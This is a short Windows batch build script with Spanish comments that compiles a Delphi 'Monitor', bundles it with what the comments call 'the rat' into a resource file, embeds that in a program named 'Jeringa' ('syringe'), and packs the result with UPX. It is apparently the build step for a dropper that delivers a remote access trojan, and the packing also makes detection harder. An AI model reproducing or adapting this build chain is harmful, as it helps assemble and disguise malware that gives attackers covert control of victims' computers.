REM copia el coolserver del directorio inferior a este
copy ..\coolserver.dll .
REM Compila el Monitor
dcc32 Monitor.dpr
REM Crea el archivo .res con el rat + monitor
brcc32 MyRes.rc
REM Compila Jeringa para que incluya en su resources el MyRes.rc
dcc32 Jeringa.dpr
REM Comprime Jeringa
upx Jeringa.exe -9
pause
 